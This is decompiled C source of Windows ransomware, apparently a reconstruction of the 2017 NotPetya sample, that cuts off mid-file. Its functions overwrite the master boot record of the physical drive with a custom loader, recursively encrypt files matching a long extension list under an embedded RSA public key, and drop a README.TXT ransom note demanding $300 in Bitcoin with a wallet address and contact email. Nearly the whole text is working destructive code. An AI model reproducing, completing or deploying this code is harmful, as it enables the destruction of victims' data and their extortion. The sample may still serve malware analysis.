/* This file has been generated by the Hex-Rays decompiler.
Copyright (c) 2007-2017 Hex-Rays <info@hex-rays.com>

Detected compiler: Visual C++
*/

#include <windows.h>
#include <iostream>

#include <wincrypt.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <Lm.h>
#include <iphlpapi.h>
#include <shlwapi.h>
#include <wincred.h>
#include <shlobj.h> 
#include <dhcpsapi.h>
#include <winsock.h>
//#include <shlobj_core.h>

#include "Idadefs.h"
#include "defs.h"
#include "Header.h"
#include "Arrays.h"
#include "ExtFiles.h"



//-------------------------------------------------------------------------
// Data declarations

int dword_681FC64C[] = { 0 }; // weak

int NullByte = 0;
int dword_68206000 = 1; // weak
int dword_68206010 = 1; // weak
BOOL byte_681FFF4C = 1; // weak

int(__stdcall *off_6820B104)(_DWORD) = &CreateHeap; // weak

__int16 word_6820F0F8; // weak
int dword_6820F0FC; // idb
LPWSTR lpMem; // idb
int EnumeratedProcessesHandle; // weak
LPCRITICAL_SECTION lpCriticalSection; // idb
int dword_6820F10C; // weak
LPCRITICAL_SECTION dword_6820F110; // idb
int PrivCheckCompleted; // weak
int TickCountTime; // weak
int dword_6820F11C; // idb
HMODULE Src; // idb
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_6820F13C; // weak
LPVOID lpParameter; // idb
int gPrivLevel; // weak
WCHAR pszPath; // idb
int dword_6820F760; // weak
struct WSAData stru_6820F768; // idb
int dword_6820F8F8; // weak
char byte_6820F8FC; // weak
char byte_6820F8FD; // weak
char byte_6820F900[464]; // weak
__int64 qword_6820FAD0; // weak
int dword_6820FAD8; // weak
int dword_6820FADC; // weak
__int32 qword_6820FAE0; // weak
int qword_6820FAE8; // idb
__int64 qword_6820FAF0; // weak
__int64 qword_6820FAF8; // weak
__int64 qword_6820FB00; // weak
int dword_6820FB08; // weak
int dword_6820FB0C; // weak
int dword_6820FB10; // weak
int dword_6820FB14; // weak
int dword_6820FB18; // weak
int dword_6820FB1C; // weak
__int16 word_6820FB20; // weak
int dword_6820FB24; // weak
__int16 word_6820FB28; // weak
__int16 word_6820FB2C; // weak
__int16 word_6820FB30; // weak
__int16 word_6820FB34; // weak
int dword_6820FB38; // weak
int dword_6820FB3C; // weak
int dword_6820FB40; // weak
__int16 word_6820FB44; // weak
int dword_6820FB48; // weak


//----- (681F1000) --------------------------------------------------------
LPVOID __stdcall CreateHeap(SIZE_T dwBytes)
{
	HANDLE v1; // eax

	v1 = GetProcessHeap();
	return HeapAlloc(v1, 8u, dwBytes);
}

//----- (681F1019) --------------------------------------------------------
void __stdcall FreeHeap(LPVOID lpMem)
{
	HANDLE ProcessHeap; // eax

	if (lpMem)
	{
		ProcessHeap = GetProcessHeap();
		HeapFree(ProcessHeap, 8u, lpMem);
	}
}

//----- (681F1038) --------------------------------------------------------
int __stdcall GetSystemVolumes(void *a1)
{
	int result; // eax
	HANDLE v2; // eax
	signed __int32 v3; // eax
	unsigned int v4; // kr00_4
	size_t v5; // edi
	unsigned int v6; // ecx
	const char *v7; // esi
	unsigned int v8; // eax
	int v9; // edi
	CHAR Buffer; // [esp+10h] [ebp-26Ch]
	char Dst; // [esp+11h] [ebp-26Bh]
	char Src; // [esp+118h] [ebp-164h]
	char v13; // [esp+119h] [ebp-163h]
	int OutBuffer; // [esp+220h] [ebp-5Ch]
	int Val; // [esp+228h] [ebp-54h]
	char DstBuf; // [esp+240h] [ebp-3Ch]
	char v17; // [esp+241h] [ebp-3Bh]
	__int16 v18; // [esp+25Dh] [ebp-1Fh]
	char v19; // [esp+25Fh] [ebp-1Dh]
	DWORD BytesReturned; // [esp+260h] [ebp-1Ch]
	HANDLE hObject; // [esp+264h] [ebp-18h]
	size_t Size; // [esp+268h] [ebp-14h]
	int v23; // [esp+26Ch] [ebp-10h]
	CHAR FileName[4]; // [esp+270h] [ebp-Ch]
	__int16 v25; // [esp+274h] [ebp-8h]

	v23 = 0;
	Buffer = 0;
	memset(&Dst, 0, 0x103u);
	Src = 0;
	memset(&v13, 0, 0x103u);
	OutBuffer = 0;
	memset(&Val, 0, 0x18u);
	DstBuf = 0;
	memset(&v17, 0, 0x1Cu);
	v18 = 0;
	strcpy(FileName, "\\\\.\\0:");
	BytesReturned = 0;
	v19 = 0;
	if (!a1)
		return 160;
	memset(a1, 0, 0x104u);
	strcpy(&Src, "\\\\.\\PhysicalDrive");
	if (GetSystemDirectoryA(&Buffer, 0x104u)
		&& (LOBYTE(v25) = Buffer, v2 = CreateFileA(FileName, 0, 3u, 0, 3u, 0, 0), hObject = v2, v2 != -1))
	{
		if (DeviceIoControl(v2, 0x560000u, 0, 0, &OutBuffer, 0x20u, &BytesReturned, 0))
		{
			itoa(Val, &DstBuf, 10);
			v4 = strlen(&Src);
			v5 = v4;
			v6 = strlen(&DstBuf);
			Size = v6;
			if (v6 + v4 + 1 <= 0x104)
			{
				if (v4 <= 0)
				{
					v7 = a1;
				}
				else
				{
					if (v4 > 0x103)
						v5 = 259;
					v7 = a1;
					memcpy(a1, &Src, v5);
					v6 = Size;
					*(a1 + v5) = 0;
				}
				v8 = strlen(v7);
				if (v6 > 0)
				{
					v9 = v6 + v8;
					if (v6 + v8 < 0x104)
					{
						memcpy(&v7[v8], &DstBuf, Size);
						v7[v9] = 0;
					}
				}
			}
			else
			{
				v23 = -2147024774;
			}
		}
		else
		{
			v3 = GetLastError();
			if (v3 > 0)
				v3 = v3 | 0x80070000;
			v23 = v3;
		}
		CloseHandle(hObject);
		result = v23;
	}
	else
	{
		result = GetLastError();
		if (result > 0)
			result = result | 0x80070000;
	}
	return result;
}

//----- (681F122D) --------------------------------------------------------
int __stdcall CreateSomeFiles(LPCSTR lpFileName, int a2)
{
	signed __int32 v2; // esi
	HANDLE v4; // edi
	signed __int32 v5; // eax
	signed __int32 v6; // eax
	int OutBuffer; // [esp+8h] [ebp-98h]
	DWORD BytesReturned; // [esp+9Ch] [ebp-4h]

	v2 = 0;
	BytesReturned = 0;
	if (!lpFileName)
		return -2147024809;
	v4 = CreateFileA(lpFileName, 0x80100000, 3u, 0, 3u, 0, 0);
	if (v4 == -1)
	{
		v5 = GetLastError();
		if (v5 > 0)
			v5 = v5 | 0x80070000;
		v2 = v5;
	}
	else
	{
		if (DeviceIoControl(v4, 0x70048u, 0, 0, &OutBuffer, 0x90u, &BytesReturned, 0))
		{
			*a2 = OutBuffer;
		}
		else
		{
			v6 = GetLastError();
			if (v6 > 0)
				v6 = v6 | 0x80070000;
			v2 = v6;
		}
		CloseHandle(v4);
	}
	return v2;
}

//----- (681F12D5) --------------------------------------------------------
int __stdcall CreateFileSetFP(LPCSTR lpFileName, void *Dst)
{
	signed __int32 v2; // esi
	HANDLE v4; // ebx
	signed __int32 v5; // eax
	signed __int32 v6; // eax
	DWORD NumberOfBytesRead; // [esp+10h] [ebp-4h]

	v2 = 0;
	NumberOfBytesRead = 0;
	if (!lpFileName)
		return 0x80070057;
	memset(Dst, 0, 0x200u);
	v4 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0, 0);
	if (v4 == -1)
	{
		v5 = GetLastError();
		if (v5 > 0)
			v5 = v5 | 0x80070000;
		v2 = v5;
	}
	else
	{
		if (!SetFilePointerEx(v4, 0i64, 0, 0) || !ReadFile(v4, Dst, 0x200u, &NumberOfBytesRead, 0))
		{
			v6 = GetLastError();
			if (v6 > 0)
				v6 = v6 | 0x80070000;
			v2 = v6;
		}
		CloseHandle(v4);
	}
	return v2;
}

//----- (681F1384) --------------------------------------------------------
int  CheckIfFileExists(int a1, LPCSTR lpFileName, LPCVOID lpBuffer)
{
	signed __int32 v3; // edi
	int v4; // esi
	HANDLE v6; // ebx
	signed __int32 v7; // eax
	signed __int32 v8; // eax
	DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h]

	v3 = 0;
	v4 = a1;
	NumberOfBytesWritten = 0;
	if (!lpFileName)
		return -2147024809;
	v6 = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 3u, 0, 0);
	if (v6 == -1)
	{
		v7 = GetLastError();
		if (v7 > 0)
			v7 = v7 | 0x80070000;
		v3 = v7;
	}
	else
	{
		if (!SetFilePointerEx(v6, (v4 << 9), 0, 0) || !WriteFile(v6, lpBuffer, 0x200u, &NumberOfBytesWritten, 0))
		{
			v8 = GetLastError();
			if (v8 > 0)
				v8 = v8 | 0x80070000;
			v3 = v8;
		}
		CloseHandle(v6);
	}
	return v3;
}

//----- (681F1424) --------------------------------------------------------
int __stdcall CryptoAcquireContext(BYTE *pbBuffer, DWORD dwLen)
{
	signed __int32 v2; // eax
	signed __int32 v3; // eax
	HCRYPTPROV phProv; // [esp+Ch] [ebp-4h]

	phProv = 0;
	if (CryptAcquireContextA(&phProv, 0, 0, 1u, 0xF0000000))
		goto LABEL_14;
	v2 = GetLastError();
	if (v2 > 0)
		v2 = v2 | 0x80070000;
	dword_6820F8F8 = v2;
	if (v2 >= 0)
	{
	LABEL_14:
		if (!CryptGenRandom(phProv, dwLen, pbBuffer))
		{
			v3 = GetLastError();
			if (v3 > 0)
				v3 = v3 | 0x80070000;
			dword_6820F8F8 = v3;
		}
	}
	if (phProv)
		CryptReleaseContext(phProv, 0);
	return dword_6820F8F8;
}
// 6820F8F8: using guessed type int dword_6820F8F8;

//----- (681F14A9) --------------------------------------------------------
int RunCryptWriteMBR()
{
	int result; // eax
	unsigned int v1; // ecx
	unsigned int v2; // edx
	unsigned int *v3; // ecx
	signed int v4; // edi
	unsigned int v5; // edx
	unsigned int v6; // eax
	char *v7; // eax
	size_t v8; // esi
	BYTE *v9; // eax
	void *v10; // eax
	int v11; // eax
	int v12; // ebx
	char *v13; // eax
	_DWORD *v14; // ecx
	signed int v15; // edx
	_DWORD *v16; // edi
	_DWORD *v17; // esi
	unsigned int v18; // esi
	unsigned int v19; // edi
	char v20; // [esp+10h] [ebp-998h]
	char v21; // [esp+11h] [ebp-997h]
	char v22; // [esp+210h] [ebp-798h]
	char v23; // [esp+211h] [ebp-797h]
	char v24; // [esp+410h] [ebp-598h]
	char v25; // [esp+411h] [ebp-597h]
	int v26; // [esp+5C8h] [ebp-3E0h]
	__int16 v27; // [esp+5CCh] [ebp-3DCh]
	char v28; // [esp+5CEh] [ebp-3DAh]
	char v29; // [esp+5D6h] [ebp-3D2h]
	char Buffer; // [esp+610h] [ebp-398h]
	BYTE v31; // [esp+611h] [ebp-397h]
	BYTE v32; // [esp+631h] [ebp-377h]
	char v33; // [esp+639h] [ebp-36Fh]
	char v34; // [esp+65Bh] [ebp-34Dh]
	char v35[343]; // [esp+6B9h] [ebp-2EFh]
	CHAR FileName; // [esp+810h] [ebp-198h]
	char Dst; // [esp+811h] [ebp-197h]
	BYTE pbBuffer; // [esp+91Ch] [ebp-8Ch]
	char v39; // [esp+91Dh] [ebp-8Bh]
	char v40; // [esp+957h] [ebp-51h]
	char Src; // [esp+958h] [ebp-50h]
	char v42; // [esp+959h] [ebp-4Fh]
	size_t v43; // [esp+998h] [ebp-10h]
	size_t Size; // [esp+99Ch] [ebp-Ch]
	const void *v45; // [esp+9A0h] [ebp-8h]
	void *v46; // [esp+9A4h] [ebp-4h]

	FileName = 0;
	memset(&Dst, 0, 0x103u);
	v24 = 0;
	memset(&v25, 0, 0x1FFu);
	Buffer = 0;
	memset(&v31, 0, 0x1FFu);
	v20 = 0;
	memset(&v21, 0, 0x1FFu);
	v22 = 0;
	memset(&v23, 0, 0x1FFu);
	pbBuffer = 0;
	memset(&v39, 0, 0x3Bu);
	Src = 0;
	memset(&v42, 0, 0x3Cu);
	Size = 0;
	result = GetSystemVolumes(&FileName);
	dword_6820F8F8 = result;
	if (result >= 0)
	{
		result = CreateSomeFiles(&FileName, &v46);
		dword_6820F8F8 = result;
		if (result >= 0)
		{
			if (v46)
			{
				result = -2147024846;
			LABEL_48:
				dword_6820F8F8 = result;
				return result;
			}
			result = CryptoAcquireContext(&pbBuffer, 0x3Cu);
			dword_6820F8F8 = result;
			if (result >= 0)
			{
				v1 = 0;
				do
				{
					v2 = *(&pbBuffer + v1++) % 0x3Au;
					*(&v40 + v1) = *(byte_681FFF4C + v2);
				} while (v1 < 0x3C);
				result = CreateFileSetFP(&FileName, &v24);
				dword_6820F8F8 = result;
				if (result >= 0)
				{
					v3 = &v29;
					v4 = 4;
					v5 = 0;
					do
					{
						if (*v3 && *v3 < 0xFFFFFFFF)
							v5 = *v3;
						v3 += 4;
						--v4;
					} while (v4);
					if (v5 == -1)
						v5 = 0;
					if (v5 <= 0x28)
					{
						result = 0x80070272;
						goto LABEL_48;
					}
					qmemcpy(&v22, &v24, 0x200u);
					v6 = 0;
					do
					{
						*(&v22 + v6) ^= 7u;
						++v6;
					} while (v6 < 0x200);
					memset(&v20, 7, 0x200u);
					Buffer = 0;
					result = CryptoAcquireContext(&v31, 0x20u);
					dword_6820F8F8 = result;
					if (result >= 0)
					{
						result = CryptoAcquireContext(&v32, 8u);
						dword_6820F8F8 = result;
						if (result >= 0)
						{
							memcpy(&v33, "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX", 0x22u);
							v34 = 0;
							v7 = &Src + strlen(&Src) + 1;
							v8 = v7 - &v42;
							if (v7 != &v42)
							{
								if (v8 > 0x156)
									v8 = 342;
								memcpy(v35, &Src, v8);
								v35[v8] = 0;
							}
							v9 = off_6820B104(512);
							v45 = v9;
							if (v9)
							{
								qmemcpy(v9, MBR1, 0x200u);
								result = 0;
							}
							else
							{
								result = 0x8007000E;
							}
							dword_6820F8F8 = result;
							if (result >= 0)
							{
								v10 = off_6820B104(8881);
								v46 = v10;
								if (v10)
								{
									Size = 8881;
									memcpy(v10, CopyFrom8881Bytes, 8881u);
									result = 0;
								}
								else
								{
									result = 0x8007000E;
								}
								dword_6820F8F8 = result;
								if (result >= 0)
								{
									v43 = Size - (Size & 0x1FF) + 1024;
									v11 = off_6820B104(v43);
									v12 = v11;
									if (!v11)
									{
										result = 0x8007000E;
										goto LABEL_48;
									}
									qmemcpy(v11, v45, 0x200u);
									*(v11 + 440) = v26;
									*(v11 + 444) = v27;
									v13 = &v28;
									v14 = (v12 + 446);
									v15 = 4;
									do
									{
										*v14 = *v13;
										v14[1] = *(v13 + 1);
										v14[2] = *(v13 + 2);
										v17 = v13 + 12;
										v16 = v14 + 3;
										v13 += 16;
										v14 += 4;
										--v15;
										*v16 = *v17;
									} while (v15);
									memcpy((v12 + 512), v46, Size);
									v18 = v43 >> 9;
									result = 0;
									if (v43 >> 9)
									{
										v19 = 0;
										if (v18)
										{
											do
											{
												result = CheckIfFileExists(v19, &FileName, v12);
												if (result < 0)
													break;
												++v19;
												v12 += 512;
											} while (v19 < v18);
										}
									}
									else
									{
										result = 0x80070057;
									}
									dword_6820F8F8 = result;
									if (result >= 0)
									{
										result = CheckIfFileExists(32, &FileName, &Buffer);
										dword_6820F8F8 = result;
										if (result >= 0)
										{
											result = CheckIfFileExists(33, &FileName, &v20);
											dword_6820F8F8 = result;
											if (result >= 0)
											{
												result = CheckIfFileExists(34, &FileName, &v22);
												goto LABEL_48;
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return result;
}
// 6820B104: using guessed type int (__stdcall *off_6820B104)(_DWORD);
// 6820F8F8: using guessed type int dword_6820F8F8;
// 681F14A9: using guessed type char var_2EF[343];

//----- (681F189A) --------------------------------------------------------
HANDLE __stdcall WriteFileMapping(LPCWSTR lpFileName, int a2)
{
	HANDLE result; // eax
	HANDLE v3; // edi
	DWORD v4; // ebx
	HANDLE v5; // eax
	void *v6; // edi
	LARGE_INTEGER FileSize; // [esp+10h] [ebp-18h]
	HANDLE v8; // [esp+1Ch] [ebp-Ch]
	HANDLE hObject; // [esp+20h] [ebp-8h]
	BOOL Final; // [esp+24h] [ebp-4h]

	result = CreateFileW(lpFileName, 0xC0000000, 0, 0, 3u, 0, 0);
	v3 = result;
	v8 = result;
	if (result != -1)
	{
		GetFileSizeEx(result, &FileSize);
		Final = 0;
		if (FileSize.QuadPart <= 0x100000)
		{
			lpFileName = FileSize.s.LowPart;
			Final = 1;
			v4 = 16 * ((FileSize.s.LowPart >> 4) + 1);
		}
		else
		{
			lpFileName = 0x100000;
			v4 = 0x100000;
		}
		v5 = CreateFileMappingW(v3, 0, 4u, 0, v4, 0);
		hObject = v5;
		if (v5)
		{
			v6 = MapViewOfFile(v5, 6u, 0, 0, lpFileName);
			if (v6)
			{
				if (CryptEncrypt(*(a2 + 20), 0, Final, 0, v6, &lpFileName, v4))
					FlushViewOfFile(v6, lpFileName);
				UnmapViewOfFile(v6);
			}
			CloseHandle(hObject);
		}
		result = CloseHandle(v8);
	}
	return result;
}

//----- (681F1973) --------------------------------------------------------
void __stdcall EnumerateFiles(LPCWSTR pszDir, int a2, int a3)
{
	void *v3; // eax
	DWORD v4; // eax
	struct _WIN32_FIND_DATAW *v5; // eax
	HANDLE hFindFile; // [esp+Ch] [ebp-86Ch]
	struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-868h]
	WCHAR FileName; // [esp+260h] [ebp-618h]
	WCHAR pszDest; // [esp+468h] [ebp-410h]
	WCHAR v10; // [esp+670h] [ebp-208h]

	if (a2)
	{
		if (PathCombineW(&pszDest, pszDir, L"*"))
		{
			hFindFile = FindFirstFileW(&pszDest, &FindFileData);
			if (hFindFile != INVALID_HANDLE_VALUE)
			{
				do
				{
					//v3 = *(a3 + 28); // origional -- probably structpointer + 7 variables.

					if (v3)
					{
						v4 = WaitForSingleObject(v3, 0);
						if (!v4 || v4 == -1)
							break;
					}
					if (wcscmp(FindFileData.cFileName, L".")
						&& wcscmp(FindFileData.cFileName, L"..")
						&& PathCombineW(&FileName, pszDir, FindFileData.cFileName))
					{
						if (!(FindFileData.dwFileAttributes & 0x10) || FindFileData.dwFileAttributes & 0x400)
						{
							v5 = PathFindExtensionW(FindFileData.cFileName);
							if (v5 != &FindFileData.cFileName[wcslen(FindFileData.cFileName)])
							{
								wsprintfW(&v10, L"%ws.", v5);
								if (StrStrIW(
									L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb."
									"gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.s"
									"ql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.",
									&v10))
								{
									WriteFileMapping(&FileName, a3);
								}
							}
						}
						else if (!StrStrIW(L"C:\\Windows;", &FileName))
						{
							EnumerateFiles(&FileName, a2 - 1, a3);
						}
					}
				} while (FindNextFileW(hFindFile, &FindFileData));
				FindClose(hFindFile);
			}
		}
	}
}
// 681FD248: using guessed type int __stdcall StrStrIW(_DWORD, _DWORD);
// 68200824: using guessed type wchar_t aCWindows[12];
// 68200840: using guessed type wchar_t Extensions[271];
// 68200A70: using guessed type wchar_t a_[2];
// 68200A74: using guessed type wchar_t a__[3];

//----- (681F1B4E) --------------------------------------------------------
bool CryptoGenerateKey(int a1)
{
	HCRYPTKEY *v1; // esi
	HCRYPTKEY v2; // ST00_4
	HCRYPTKEY v3; // ST00_4
	BOOL v5; // [esp+8h] [ebp-Ch]
	BYTE v6[4]; // [esp+Ch] [ebp-8h]
	BYTE pbData[4]; // [esp+10h] [ebp-4h]

	v1 = (a1 + 20);
	v5 = CryptGenKey(*(a1 + 8), 0x660Eu, 1u, (a1 + 20));
	if (v5)
	{
		v2 = *v1;
		*pbData = 1;
		CryptSetKeyParam(v2, 4u, pbData, 0);
		v3 = *v1;
		*v6 = 1;
		CryptSetKeyParam(v3, 3u, v6, 0);
	}
	return v5;
}

//----- (681F1BA0) --------------------------------------------------------
BOOL __stdcall ImportPubKey(int a1)
{
	const WCHAR *v1; // ST08_4
	BYTE *v2; // ebx
	BYTE *v3; // eax
	BOOL v5; // [esp+8h] [ebp-14h]
	BYTE *pbData; // [esp+10h] [ebp-Ch]
	DWORD pcbStructInfo; // [esp+14h] [ebp-8h]
	DWORD pcbBinary; // [esp+18h] [ebp-4h]

	v1 = *(a1 + 16);
	v5 = 0;
	pcbBinary = 0;
	if (CryptStringToBinaryW(v1, 0, 1u, 0, &pcbBinary, 0, 0))
	{
		v2 = LocalAlloc(0x40u, pcbBinary);
		if (v2)
		{
			if (CryptStringToBinaryW(
				L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iD"
				"qmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+C"
				"XsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJY"
				"CeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB",
				0,
				1u,
				v2,
				&pcbBinary,
				0,
				0))
			{
				pcbStructInfo = 0;
				if (CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, 0, &pcbStructInfo))
				{
					v3 = LocalAlloc(0x40u, pcbStructInfo);
					pbData = v3;
					if (v3)
					{
						if (CryptDecodeObjectEx(0x10001u, 0x13, v2, pcbBinary, 0, 0, v3, &pcbStructInfo))
							v5 = CryptImportKey(*(a1 + 8), pbData, pcbStructInfo, 0, 0, (a1 + 12));
						LocalFree(pbData);
					}
				}
			}
			LocalFree(v2);
		}
	}
	return v5;
}

//----- (681F1C7F) --------------------------------------------------------
HLOCAL  CryptoExportKey(int a1)
{
	int v1; // esi
	HCRYPTKEY v2; // ST04_4
	HCRYPTKEY v3; // ST00_4
	BYTE *v4; // eax
	HLOCAL v5; // edi
	HLOCAL v7; // [esp+Ch] [ebp-10h]
	BYTE *pbBinary; // [esp+10h] [ebp-Ch]
	DWORD pcchString; // [esp+14h] [ebp-8h]
	DWORD pdwDataLen; // [esp+18h] [ebp-4h]

	v1 = a1;
	v2 = *(a1 + 12);
	v7 = 0;
	v3 = *(a1 + 20);
	pdwDataLen = 0;
	if (CryptExportKey(v3, v2, 1u, 0, 0, &pdwDataLen))
	{
		v4 = LocalAlloc(0x40u, pdwDataLen);
		pbBinary = v4;
		if (v4)
		{
			if (CryptExportKey(*(v1 + 20), *(v1 + 12), 1u, 0, v4, &pdwDataLen))
			{
				pcchString = 0;
				if (CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, 0, &pcchString))
				{
					v5 = LocalAlloc(0x40u, 2 * pcchString);
					if (v5)
					{
						if (CryptBinaryToStringW(pbBinary, pdwDataLen, 1u, v5, &pcchString))
							v7 = v5;
						else
							LocalFree(v5);
					}
				}
			}
			LocalFree(pbBinary);
		}
	}
	return v7;
}

//----- (681F1D32) --------------------------------------------------------
HLOCAL __stdcall GenerateReadMeMessage(LPCWSTR pszDir)
{
	HLOCAL result; // eax
	DWORD v2; // eax
	HANDLE v3; // ebx
	WCHAR pszDest; // [esp+0h] [ebp-620h]
	LPCVOID lpBuffer; // [esp+618h] [ebp-8h]
	DWORD NumberOfBytesWritten; // [esp+61Ch] [ebp-4h]

	result = ImportPubKey(pszDir);
	if (result)
	{
		result = CryptoExportKey(pszDir);
		lpBuffer = result;
		if (result)
		{
			if (PathCombineW(&pszDest, pszDir, L"README.TXT"))
			{
				v2 = ReturnTimeIfTimePassed();
				if (v2)
					Sleep(60000 * (v2 - 1));
				v3 = CreateFileW(&pszDest, 0x40000000u, 0, 0, 2u, 0, 0);
				if (v3 != -1)
				{
					NumberOfBytesWritten = 0;
					WriteFile(
						v3,
						L"Ooops, your important files are encrypted.\r\n"
						"\r\n"
						"If you see this text, then your files are no longer accessible, because\r\n"
						"they have been encrypted. Perhaps you are busy looking for a way to recover\r\n"
						"your files, but don't waste your time. Nobody can recover your files without\r\n"
						"our decryption service.\r\n"
						"\r\n"
						"We guarantee that you can recover all your files safely and easily.\r\n"
						"All you need to do is submit the payment and purchase the decryption key.\r\n"
						"\r\n"
						"Please follow the instructions:\r\n"
						"\r\n"
						"1.\tSend $300 worth of Bitcoin to following address:\r\n"
						"\r\n",
						0x432u,
						&NumberOfBytesWritten,
						0);
					WriteFile(v3, L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n", 0x4Cu, &NumberOfBytesWritten, 0);
					WriteFile(
						v3,
						L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ",
						0x8Eu,
						&NumberOfBytesWritten,
						0);
					WriteFile(v3, L"wowsmith123456@posteo.net.\r\n", 0x38u, &NumberOfBytesWritten, 0);
					WriteFile(v3, L"\tYour personal installation key:\r\n\r\n", 0x48u, &NumberOfBytesWritten, 0);
					WriteFile(v3, lpBuffer, 2 * wcslen(lpBuffer), &NumberOfBytesWritten, 0);
					CloseHandle(v3);
				}
			}
			result = LocalFree(*(pszDir + 6));
		}
	}
	return result;
}
// 681FFFB0: using guessed type wchar_t aYourPersonalIn[37];
// 681FFFFC: using guessed type wchar_t ReadMeEmailAddr[29];
// 68200038: using guessed type wchar_t a2_SendYourBitc[72];
// 682000C8: using guessed type wchar_t BitCoinAddress[39];
// 68200118: using guessed type wchar_t aOoopsYourImpor[538];

//----- (681F1E51) --------------------------------------------------------
DWORD __stdcall CryptoCleanUp(LPVOID lpThreadParameter)
{
	DWORD v1; // eax
	BOOL v2; // eax
	void *v3; // esi

	if (CryptAcquireContextW(
		lpThreadParameter + 2,
		0,
		L"Microsoft Enhanced RSA and AES Cryptographic Provider",
		0x18u,
		CRYPT_VERIFYCONTEXT))
	{
		goto LABEL_7;
	}
	v1 = GetLastError();
	if (v1 == NTE_KEYSET_NOT_DEF)
	{
		v2 = CryptAcquireContextW(lpThreadParameter + 2, 0, 0, 0x18u, CRYPT_VERIFYCONTEXT);
	}
	else
	{
		if (v1 != NTE_BAD_KEYSET)
		{
		LABEL_10:
			v3 = lpThreadParameter;
			goto LABEL_11;
		}
		v2 = CryptAcquireContextW(
			lpThreadParameter + 2,
			0,
			L"Microsoft Enhanced RSA and AES Cryptographic Provider",
			0x18u,
			8u);
	}
	if (!v2)
		goto LABEL_10;
LABEL_7:
	v3 = lpThreadParameter;
	if (CryptoGenerateKey(lpThreadParameter))
	{
		EnumerateFiles(lpThreadParameter, 15, lpThreadParameter);
		GenerateReadMeMessage(lpThreadParameter);
		CryptDestroyKey(*(lpThreadParameter + 5));
	}
	CryptReleaseContext(*(lpThreadParameter + 2), 0);
LABEL_11:
	LocalFree(v3);
	return 0;
}

//----- (681F1EEF) --------------------------------------------------------
_DWORD *CheckDriveAndPubKey()
{
	DWORD v0; // ebx
	signed int v1; // edi
	_DWORD *result; // eax
	WCHAR RootPathName[2]; // [esp+Ch] [ebp-8h]
	int v4; // [esp+10h] [ebp-4h]

	v0 = GetLogicalDrives();
	v1 = 31;
	do
	{
		result = (1 << v1);
		if ((1 << v1) & v0)
		{
			RootPathName[0] = v1 + 65;
			RootPathName[1] = 58;
			v4 = 92;
			result = GetDriveTypeW(RootPathName);
			if (result == 3)
			{
				result = LocalAlloc(0x40u, 0x20u);
				if (result)
				{
					result[4] = L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"
						"hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"
						"VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"
						"ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB";
					result[7] = 0;
					*result = *RootPathName;
					result[1] = v4;
					result = CreateThread(0, 0, CryptoCleanUp, result, 0, 0);
				}
			}
		}
		--v1;
	} while (v1 >= 0);
	return result;
}

//----- (681F1F74) --------------------------------------------------------
bool __stdcall GetHeapAndMoveData(void *a1, size_t a2, void *Src, size_t Size, void *a5, size_t a6, int a7, int a8, void *a9, int a10, void *a11, int a12)
{
	size_t v12; // eax
	bool result; // al
	HANDLE v14; // eax
	char *v15; // edi
	char *v16; // edi
	_DWORD *v17; // edi

	v12 = Size + a6 + 487362;
	*a8 = v12;
	if (a10 >= 0x2000)
		a10 = 0x1FFF;
	if (a12 > 0x80)
		a12 = 127;
	if (v12 < Size + a2 + a6 + 18460)
		return 0;
	v14 = GetProcessHeap();
	v15 = HeapAlloc(v14, 8u, Size + a6 + 487362);
	*a7 = v15;
	result = 0;
	if (memcpy(v15, Src, Size))
	{
		v16 = &v15[Size];
		if (memcpy(v16, a11, 2 * a12))
		{
			v17 = v16 + 256;
			if (memcpy(v17, a9, 2 * a10))
			{
				v17[4550] = a2;
				if (memcpy(v17 + 4551, a1, a2))
				{
					if (memcpy((*a7 + Size + 487362), a5, a6))
						result = 1;
				}
			}
		}
	}
	return result;
}

//----- (681F2068) --------------------------------------------------------
int  SockCloseConnection(SOCKET *a1)
{
	SOCKET *v1; // esi
	signed int v2; // edi
	int result; // eax

	v1 = a1;
	v2 = 21;
	do
	{
		result = *v1;
		if (*v1)
			result = closesocket(*v1);
		*v1 = -1;
		++v1;
		--v2;
	} while (v2);
	return result;
}

//----- (681F2088) --------------------------------------------------------
